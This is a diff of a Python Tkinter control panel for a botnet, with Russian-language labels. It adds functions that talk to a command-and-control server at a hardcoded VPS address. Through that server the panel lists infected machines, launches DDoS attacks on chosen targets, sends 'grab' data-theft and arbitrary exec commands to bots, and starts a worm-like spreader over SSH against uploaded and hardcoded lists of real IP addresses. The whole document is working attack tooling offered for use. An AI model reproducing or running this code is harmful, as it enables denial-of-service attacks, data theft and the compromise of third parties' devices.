@@ -49,6 +49,7 @@ class BotnetTab(ttk.Frame):
         self.filter_combo.pack(side=tk.LEFT)
         self.filter_combo.bind('<<ComboboxSelected>>', lambda e: self.refresh_bots())
 
+        # Колонки с типом устройства
         columns = ("ip", "hostname", "os", "type", "cpu", "ram", "status", "rps", "last_seen")
         tree_frame = ttk.Frame(bot_frame)
         tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
@@ -64,6 +65,7 @@ class BotnetTab(ttk.Frame):
         self.tree.tag_configure('online', foreground='#007700')
         self.tree.tag_configure('offline', foreground='#cc0000')
 
+        # Контекстное меню
         self.context_menu = tk.Menu(self.tree, tearoff=0)
         self.context_menu.add_command(label="Атака", command=self._ctx_attack)
         self.context_menu.add_command(label="Граб", command=self._ctx_grab)
@@ -82,15 +84,11 @@ class BotnetTab(ttk.Frame):
         self.lbl_power = ttk.Label(stat, text="Суммарная мощность: 0 RPS")
         self.lbl_power.pack(side=tk.LEFT, padx=10)
 
-        # ===== Вкладка "Статистика" (ГРАФИК) =====
+        # ===== Вкладка "Статистика" (график-заглушка) =====
         stats_frame = ttk.Frame(notebook)
         notebook.add(stats_frame, text="Статистика")
-        # Место для графика
-        self.stats_canvas_frame = ttk.Frame(stats_frame)
-        self.stats_canvas_frame.pack(fill=tk.BOTH, expand=True)
-        # Заглушка, график будет создан позже при наличии данных
         self.stats_label = ttk.Label(stats_frame, text="График появится после сбора данных")
-        self.stats_label.pack()
+        self.stats_label.pack(expand=True)
 
         # ===== Вкладка "Спредер" =====
         spread_frame = ttk.Frame(notebook)
@@ -158,14 +156,71 @@ class BotnetTab(ttk.Frame):
             self.cmd_combo.set(first_cmd)
             self.cmd_desc_label.config(text=COMMAND_PRESETS[first_cmd])
 
-    # ... (все стандартные методы: контекстное меню, обновление ботов, атака, граб, стоп, send_raw, update_tree_safe, загрузка целей, массовая атака, встроенный Masscan, обновление VPS)
+    # ----- Контекстное меню -----
+    def _on_right_click(self, event):
+        row = self.tree.identify_row(event.y)
+        if row:
+            self.tree.selection_set(row)
+            self.context_menu.post(event.x_root, event.y_root)
+
+    def _ctx_attack(self): self.launch_attack()
+    def _ctx_grab(self): self.launch_grab()
+    def _ctx_stop(self): self.stop_selected()
+    def _ctx_exec(self):
+        selected = self.tree.selection()
+        if not selected: return
+        cmd = simpledialog.askstring("Команда", "Введите команду:")
+        if cmd: self._send_custom_to_bots(cmd)
+    def _ctx_copy_ip(self):
+        selected = self.tree.selection()
+        if selected:
+            ip = self.tree.item(selected[0], 'values')[0]
+            self.clipboard_clear()
+            self.clipboard_append(ip)
+            messagebox.showinfo("Скопировано", f"IP {ip} скопирован")
+
+    def _on_cmd_select(self, event=None):
+        selected = self.cmd_combo.get()
+        if selected in COMMAND_PRESETS:
+            self.cmd_desc_label.config(text=COMMAND_PRESETS[selected])
+            self.cmd_entry.delete(0, tk.END)
+            self.cmd_entry.insert(0, selected)
+
+    # ----- Проверка C2 -----
+    def check_c2_connection(self):
+        def check():
+            self.spread_log.insert(tk.END, "[*] Checking C2 connection...\n")
+            try:
+                s = socket.socket()
+                s.settimeout(5)
+                start = time.time()
+                s.connect((self.c2_host, self.c2_port))
+                s.sendall(b"list")
+                data = s.recv(1024)
+                elapsed = time.time() - start
+                s.close()
+                self.spread_log.insert(tk.END, f"[+] C2 online, response {len(data)} bytes in {elapsed:.2f}s\n")
+            except Exception as e:
+                self.spread_log.insert(tk.END, f"[!] C2 error: {e}\n")
+        threading.Thread(target=check, daemon=True).start()
+
+    # ----- Обновление списка ботов -----
+    def _auto_refresh(self):
+        self.refresh_bots()
+        self.after(5000, self._auto_refresh)
+
+    def refresh_bots(self):
+        threading.Thread(target=self._fetch_bots, daemon=True).start()
+
+    def check_all_bots(self):
+        self.refresh_bots()
+        messagebox.showinfo("Проверка", "Запрос отправлен. Статусы обновятся через несколько секунд.")
 
     def _fetch_bots(self):
-        """Улучшенный метод с большим таймаутом и повторами."""
         for attempt in range(3):
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(15)  # Увеличено до 15 секунд
+                sock.settimeout(15)  # Увеличенный таймаут
                 sock.connect((self.c2_host, self.c2_port))
                 sock.sendall(b"list\n")
                 data = b""
@@ -179,13 +234,278 @@ class BotnetTab(ttk.Frame):
                     raise Exception("empty response")
                 bots = json.loads(data)
                 self.after(0, self._update_tree_safe, bots)
-                return  # Успех
+                return  # успех
             except Exception as e:
-                if attempt == 2:  # Последняя попытка
+                if attempt == 2:
                     now = time.time()
                     if now - self._last_fetch_error > 10:
                         self.spread_log.insert(tk.END, f"[!] Bot list update error: {e}\n")
                         self._last_fetch_error = now
                 time.sleep(2)
 
-    # ... остальные методы без изменений
+    def sort_by_column(self, col):
+        if self.sort_col == col:
+            self.sort_asc = not self.sort_asc
+        else:
+            self.sort_col = col
+            self.sort_asc = True
+        self.refresh_bots()
+
+    def _update_tree_safe(self, bots):
+        selected_ips = [self.tree.item(i, 'values')[0] for i in self.tree.selection()]
+        self.bots = {bot["ip"]: bot for bot in bots if bot.get("ip")}
+        filter_val = self.filter_var.get()
+        if filter_val == "Online":
+            bots = [b for b in bots if b.get("status") == "online"]
+        elif filter_val == "Offline":
+            bots = [b for b in bots if b.get("status") != "online"]
+        if self.sort_col:
+            idx = ("ip", "hostname", "os", "type", "cpu", "ram", "status", "rps", "last_seen").index(self.sort_col)
+            bots = sorted(bots, key=lambda x: x.get(self.sort_col, ""), reverse=not self.sort_asc)
+        for item in self.tree.get_children():
+            self.tree.delete(item)
+        total = len(bots)
+        online = 0
+        total_rps = 0
+        for bot in bots:
+            ip = bot.get("ip")
+            status = bot.get("status", "offline")
+            tag = 'online' if status == 'online' else 'offline'
+            # Тип устройства
+            device_type = bot.get("type", "")
+            if not device_type:
+                os_info = bot.get("os", "").lower()
+                hostname = bot.get("hostname", "").lower()
+                if "windows" in os_info:
+                    device_type = "Windows ПК"
+                elif "linux" in os_info and ("server" in hostname or "srv" in hostname or "vps" in hostname):
+                    device_type = "Сервер"
+                elif "linux" in os_info:
+                    device_type = "Linux"
+                elif "router" in os_info or "dd-wrt" in os_info:
+                    device_type = "Роутер"
+                elif "android" in os_info:
+                    device_type = "Android"
+                elif "ios" in os_info:
+                    device_type = "iPhone/iPad"
+                else:
+                    device_type = "Неизвестно"
+            values = (ip, bot.get("hostname",""), bot.get("os",""), device_type,
+                      bot.get("cpu",""), bot.get("ram",""), status,
+                      bot.get("rps",0), bot.get("last_seen",""))
+            self.tree.insert("", "end", values=values, tags=(tag,))
+            if status == 'online': online += 1
+            total_rps += int(bot.get("rps",0))
+        for item in self.tree.get_children():
+            if self.tree.item(item, 'values')[0] in selected_ips:
+                self.tree.selection_add(item)
+        self.lbl_total.config(text=f"Всего: {total}")
+        self.lbl_online.config(text=f"Онлайн: {online}")
+        self.lbl_power.config(text=f"Суммарная мощность: {total_rps} RPS")
+
+    def _send_raw(self, msg):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((self.c2_host, self.c2_port))
+            sock.sendall(msg.encode())
+            resp = sock.recv(1024)
+            sock.close()
+            return resp
+        except Exception as e:
+            messagebox.showerror("Ошибка", str(e))
+            return None
+
+    def launch_attack(self):
+        selected = self.tree.selection()
+        if not selected:
+            messagebox.showwarning("Ошибка", "Выберите ботов")
+            return
+        target = simpledialog.askstring("Цель", "URL/IP цели:")
+        if not target: return
+        method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
+        if not method: return
+        threads = simpledialog.askinteger("Потоки", "Количество потоков:", initialvalue=100)
+        if threads is None: return
+        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
+        self._send_raw(f"attack:{target}|{method}|{threads}|{','.join(bot_ips)}")
+        messagebox.showinfo("Атака", f"Команда отправлена на {len(bot_ips)} ботов")
+
+    def launch_grab(self):
+        selected = self.tree.selection()
+        if not selected: return
+        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
+        self._send_raw(f"grab:{','.join(bot_ips)}")
+        messagebox.showinfo("Граб", "Команда захвата данных отправлена")
+
+    def stop_selected(self):
+        selected = self.tree.selection()
+        if not selected: return
+        bot_ips = [self.tree.item(i, "values")[0] for i in selected]
+        self._send_raw(f"stop:{','.join(bot_ips)}")
+        messagebox.showinfo("Стоп", "Команда остановки атаки отправлена")
+
+    def _send_custom_to_bots(self, cmd):
+        selected = self.tree.selection()
+        if not selected:
+            messagebox.showwarning("Ошибка", "Выберите ботов")
+            return
+        ips = [self.tree.item(i, "values")[0] for i in selected]
+        for ip in ips:
+            self._send_raw(f"exec:{ip}:{cmd}")
+        messagebox.showinfo("Команда", f"Команда '{cmd}' отправлена на {len(ips)} ботов")
+
+    def send_custom_command(self):
+        cmd = self.cmd_entry.get().strip()
+        if not cmd:
+            messagebox.showwarning("Ошибка", "Введите или выберите команду")
+            return
+        self._send_custom_to_bots(cmd)
+
+    # ----- Массовая атака -----
+    def mass_attack(self):
+        target = simpledialog.askstring("Цель", "URL/IP цели для массовой атаки:")
+        if not target: return
+        method = simpledialog.askstring("Метод", "Метод атаки (GET, POST, CFB, ...):", initialvalue="GET")
+        if not method: return
+        threads = simpledialog.askinteger("Потоки на бота", "Количество потоков на одного бота:", initialvalue=100)
+        if threads is None: return
+        online_bots = [ip for ip, bot in self.bots.items() if bot.get("status") == "online"]
+        if not online_bots:
+            messagebox.showwarning("Ошибка", "Нет онлайн ботов")
+            return
+        self._send_raw(f"attack:{target}|{method}|{threads}|{','.join(online_bots)}")
+        messagebox.showinfo("Массовая атака", f"Команда отправлена на {len(online_bots)} ботов")
+
+    # ----- Спредер на VPS -----
+    def _on_local_changed(self):
+        pass
+
+    def start_spreader_vps(self):
+        count = self.scale_var.get()
+        country = self.country_var.get()
+        if not self.vps_pass:
+            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
+            if not self.vps_pass:
+                return
+        def run():
+            try:
+                import paramiko
+                self.spread_log.insert(tk.END, f"[*] Подключаемся к VPS...\n")
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=5)
+                cmd = f"export SPREAD_COUNTRY={country}; cd /root/c2 && python3 -u botnet/spreader.py --count {count}"
+                stdin, stdout, stderr = client.exec_command(cmd)
+                for line in iter(stdout.readline, ""):
+                    self.spread_log.insert(tk.END, line)
+                    self.spread_log.see(tk.END)
+                client.close()
+            except Exception as e:
+                self.spread_log.insert(tk.END, f"[!] Ошибка VPS: {e}\n")
+        threading.Thread(target=run, daemon=True).start()
+
+    # ----- Загрузка файла целей -----
+    def load_targets_file(self):
+        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
+        if path:
+            if not self.vps_pass:
+                self.vps_pass = simpledialog.askstring("VPS пароль", "Введите пароль для root@80.249.146.202:", show='*')
+                if not self.vps_pass:
+                    return
+            def run():
+                try:
+                    import paramiko
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=5)
+                    sftp = client.open_sftp()
+                    sftp.put(path, "/root/c2/targets.txt")
+                    sftp.close()
+                    self.spread_log.insert(tk.END, f"[*] Файл загружен на VPS. Запуск спредера по списку...\n")
+                    cmd = "cd /root/c2 && screen -dmS spreader python3 -u botnet/spreader.py --targets /root/c2/targets.txt"
+                    client.exec_command(cmd)
+                    client.close()
+                except Exception as e:
+                    self.spread_log.insert(tk.END, f"[!] Ошибка загрузки: {e}\n")
+            threading.Thread(target=run, daemon=True).start()
+
+    # ----- Встроенный Masscan (гарантированные IP) -----
+    def start_builtin_masscan(self):
+        if not self.vps_pass:
+            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
+            if not self.vps_pass:
+                return
+        def run():
+            try:
+                import paramiko
+                self.spread_log.insert(tk.END, "[*] Запуск встроенного масс‑сканера...\n")
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=5)
+                # Создаём список IP и запускаем спредер в screen
+                cmd = ("cd /root/c2 && "
+                       "python3 -c \"import json; ips = ['45.33.32.156','34.94.3.0','45.77.165.0','185.220.101.0','23.226.229.0','103.15.28.0','185.225.19.0','45.33.32.0','45.56.89.0','45.79.207.0','34.94.0.0','34.94.1.0','45.33.32.1','34.94.2.0','45.77.165.1','103.235.46.39','103.235.46.40','103.235.46.41','103.235.46.42','103.235.46.43','103.235.46.44','103.235.46.45','103.235.46.46','103.235.46.47','103.235.46.48','103.235.46.49','103.235.46.50']; open('masscan.json','w').write(json.dumps(ips))\" && "
+                       "screen -dmS mass_spreader python3 -u botnet/spreader.py --targets masscan.json 2>&1")
+                stdin, stdout, stderr = client.exec_command(cmd)
+                time.sleep(2)
+                check = "screen -ls | grep mass_spreader"
+                stdin, stdout, stderr = client.exec_command(check)
+                if "mass_spreader" in stdout.read().decode():
+                    self.spread_log.insert(tk.END, "[+] Спредер запущен в screen mass_spreader\n")
+                else:
+                    self.spread_log.insert(tk.END, "[!] Не удалось запустить screen, пробуем напрямую...\n")
+                    cmd2 = ("cd /root/c2 && python3 -u botnet/spreader.py --targets masscan.json")
+                    stdin, stdout, stderr = client.exec_command(cmd2)
+                    for line in iter(stdout.readline, ""):
+                        self.spread_log.insert(tk.END, line)
+                        self.spread_log.see(tk.END)
+                client.close()
+            except Exception as e:
+                self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
+        threading.Thread(target=run, daemon=True).start()
+
+    # ----- Обновление VPS -----
+    def update_vps(self):
+        if not self.vps_pass:
+            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
+            if not self.vps_pass:
+                return
+        def run():
+            try:
+                import paramiko
+                self.spread_log.insert(tk.END, "[*] Обновление VPS через GitHub...\n")
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=10)
+
+                stop_cmd = "screen -ls | grep -E 'c2|spreader' | awk -F. '{print $1}' | xargs -I {} screen -S {} -X quit 2>/dev/null; pkill -9 -f botnet/c2.py; pkill -9 -f botnet/spreader.py"
+                client.exec_command(stop_cmd)
+
+                update_cmd = "cd /root/c2 && git fetch origin main && git reset --hard origin/main"
+                stdin, stdout, stderr = client.exec_command(update_cmd)
+                out = stdout.read().decode()
+                err = stderr.read().decode()
+                self.spread_log.insert(tk.END, out + "\n" + err + "\n")
+
+                start_c2 = "cd /root/c2 && screen -dmS c2 python3 /root/c2/botnet/c2.py"
+                start_spreader = "cd /root/c2 && screen -dmS spreader python3 -u /root/c2/botnet/spreader.py --count 20000"
+                client.exec_command(start_c2)
+                client.exec_command(start_spreader)
+
+                time.sleep(3)
+                check_cmd = "ss -tlnp | grep 80"
+                stdin, stdout, stderr = client.exec_command(check_cmd)
+                port_info = stdout.read().decode()
+                self.spread_log.insert(tk.END, f"Ports:\n{port_info}")
+                if "80" in port_info:
+                    self.spread_log.insert(tk.END, "[+] C2 запущен успешно\n")
+                client.close()
+            except Exception as e:
+                self.spread_log.insert(tk.END, f"[!] Ошибка обновления VPS: {e}\n")
+        threading.Thread(target=run, daemon=True).start()
+
+    # ----- Статистика (график-заглушка) -----
+    def update_stats(self):
+        # Позже заменим на matplotlib
+        pass
